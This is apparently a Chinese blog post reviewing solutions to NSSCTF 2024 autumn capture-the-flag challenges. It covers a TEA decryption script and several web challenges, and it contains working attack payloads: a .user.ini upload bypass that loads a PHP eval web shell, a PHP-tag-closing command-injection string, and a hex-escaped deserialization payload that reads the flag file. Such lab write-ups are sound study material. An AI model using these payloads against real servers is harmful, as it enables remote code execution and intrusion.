---
title: nssctf2024秋季回顾
date: 2024-10-31 20:18:03
categories: CTF
tags: ctf
crated: 2026-01-20T15:50
updated: 2026-01-20T15:39
---
# nssctf2024秋季回顾
## 前言
这个比赛也算是打的比较舒服的一个比赛，不过后期有点懈怠了，有许多题都没有看主要是没有什么想法吧，回顾主要是把不会的和想学习的写一下，已经出来的就不打算再写了

## reverse
### NSS茶馆
这个题没想到是tea，最近接触少了，敏感度骤然下降，还是要好好把握一下
- 先是查壳
![](https://gitee.com/fogpost/photo/raw/master/202410312022329.png)
- 老样子32位启动
![](https://gitee.com/fogpost/photo/raw/master/202410312040919.png)
在这个图中的sub_411118便是我们的解密函数，判断函数
![](https://gitee.com/fogpost/photo/raw/master/202410312046855.png)
tea本体
![](https://gitee.com/fogpost/photo/raw/master/202410312047549.png)
解题脚本
```c++
#include <stdio.h>
#include <stdint.h>
#include <bits/stdc++.h>

void decrypt(uint32_t* v,uint32_t * k)
{
    uint32_t v0=v[0],v1=v[1],sum=1131796*33, i;
    uint32_t delta=1131796;
    uint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];
    for (i=0; i<33; i++){
        v1-=((v0<<4)+k2)^(v0+sum)^((v0>>5)+k3);
        v0-=((v1<<4)+k0)^(v1+sum)^((v1>>5)+k1);
        sum -=delta;
    }
    v[0]=v0;v[1]=v1;
}

typedef struct {
    uint32_t values[2];
} Data;

// unsigned char enc[] =
// {
//   0x65, 0xD2, 0x26, 0x3A, 0xB6, 0xA0, 0xD9, 0x81, 0x2A, 0x00, 
//   0x5E, 0x0E, 0xE5, 0xEF, 0x07, 0x39, 0x57, 0xBC, 0xB6, 0x71, 
//   0xA2, 0x0D, 0xAC, 0xE0
// };

int main(){
    Data v[3]={{0x3A26D265,0x81D9A0B6},{0x0E5E002A,0x3907EFE5},{0x71B6BC57,0xE0AC0DA2}};
    uint32_t k[4]={0x0B, 0x16, 0x21, 0x2C};
    for (size_t i = 0; i < 3; i++)
    {
        decrypt(v[i].values,k);
        printf("decrtp:%x %x\n",v[i].values[0],v[i].values[1]);
    }
    
    return 0;
}
```
结果是这个
decrtp:4e535343 54467b74
decrtp:65615f69 735f736f
decrtp:5f656173 7921217d
直接就是hex转chr了
![](https://gitee.com/fogpost/photo/raw/master/202410312118868.png)
NSSCTF{tea_is_so_easy!!}

### MD5爆破
纯手撸，题解也看不懂，脚本都跑不动

## web
### 怎么多了个没用的php文件
开头就是一个文件上传页面
![](https://gitee.com/fogpost/photo/raw/master/202411011425977.png)
我们选择一个文件直接上传，png可以上传，对php有过滤
![](https://gitee.com/fogpost/photo/raw/master/202411011439740.png)
![](https://gitee.com/fogpost/photo/raw/master/202411011440878.png)  
然后我们尝试抓包并修改数据，可以成功上传，尝试访问
![](https://gitee.com/fogpost/photo/raw/master/202411011442332.png)
![](https://gitee.com/fogpost/photo/raw/master/202411011442165.png)
其中也尝试了其他的后缀，不过可以上传但是不可以解析，按照别人的wp来看，好像是uploads目录下有一个notion.php文件
![](https://gitee.com/fogpost/photo/raw/master/202411011454711.png)
尝试上传.user.ini
>.user.ini 是⼀个⽤户⾃定义的php.ini ⽂件，会在其所在的当前⽬录⽣效，优先级⾼于php.ini 
在user.ini中写⼊以下内容   
auto_prepend_file = \<filename>    //包含在⽂件头     
auto_append_file = \<filename>      //包含在⽂件尾     
写⼊其中⼀个即可  
\<filename>就写成需要包含的⽂件名，后缀任意上传后，该⽬录下的php⽂件就会⾃动包含\<filename> 
.user.ini
```
auto_prepend_file = 外部文件包含.png
auto_append_file = 外部文件包含.png 
```
外部文件包含.png
```php
<?php eval($_POST[0]);?>
```
利用蚁剑成功连接
![](https://gitee.com/fogpost/photo/raw/master/202411011528057.png)
![](https://gitee.com/fogpost/photo/raw/master/202411011529825.png)
NSSCTF{11822be1-0c76-4bc8-9f67-82fcf3f3ec33}

### 未选择的路
打开环境
```php
<?php
//一片森林里分出两条路————而我选择了人迹更少的一条，从此决定了我一生的道路。
Include('check.php');
highlight_file(__FILE__);
error_reporting(0);

$A=$_GET['easy'];
$B=$_GET['hard'];

if (isset($A)){
eval('e'.'x'.'i'.'t'.'(); ?>'.$A.'<?php ;');//这条路没有任何过滤诶，是不是好走一些
}
if (isset($B)){
check($B);//要被正则了，嘤嘤嘤
eval("#cmd".$B."inject");//这条路怎么还要禁我东西啊，真下头
}
```
先用hard走 hard=system，不过会显示passthru和system被禁用了，使用?>反引号加闭合?hard=?>\<?php echo \`id\`;?>(这个不是引号，这个是反引号)
这个时候id就是可以执行得命令有点感觉是将前面得过滤，重新插了一个新得php进来执行完成绕过
尝试一下easy，好像会直接结束，方式就是在hard过滤

### Maxser Revenge
```php
<?php
 highlight_file(__FILE__);
 error_reporting(0);
 include('check.php');
 class passthru{
 public $S;
 public $dir;
 public function __wakeup(){
 $this->dir='notion';
 }
 public function __destruct(){
 eval($this->S);
 }
 }
 $a=$_GET['NSS'];
 check($a);
 unserialize($a);
```
一道反序列化题目,我们尝试简单构建pop链，发现存在过滤
```php
$a=new passthru();
$a->S="system('ls /')";
echo serialize($a);
    O:8:"passthru":2:{s:1:"S";s:14:"system('ls /')";s:3:"dir";N;}
```
![](https://gitee.com/fogpost/photo/raw/master/202411041446655.png)
利用passthru过滤，转换成16进制来过滤
>passthru("cat /f*")这个转化成16进制不会产生字母
70 61 73 73 74 68 72 75 28 22 63 61 74 20 2F 66 2A 22 29  
2f和2a换成/和*这两个直接用  
O:8:"passthru":2:{s:1:"S";S:20:"\70\61\73\73\74\68\72\75\28\22\63\61\74\20/\66*\22\29;";s:3:"dir";N;}直接修改，并用大写S来支持字符串得编码

### The future Revenge
考点CVE-2024-2961  
https://blog.csdn.net/jennycisp/article/details/140148391  
https://err0r233.github.io/posts/28510.html (要梯子)

### 签到
点击后就是这个界面
![](https://gitee.com/fogpost/photo/raw/master/202411071924871.png)
我们点击sign,最后一个博客地址判断存在ssrf
![](https://gitee.com/fogpost/photo/raw/master/202411071925412.png)
我们查看源码,index.php、submit.php、save_user.php、show_blog.php,存在这么几个文件
![](https://gitee.com/fogpost/photo/raw/master/202411071927695.png)
这个好像涉及ssrf了,本人不是很懂,现在先暂停一下,之后补上来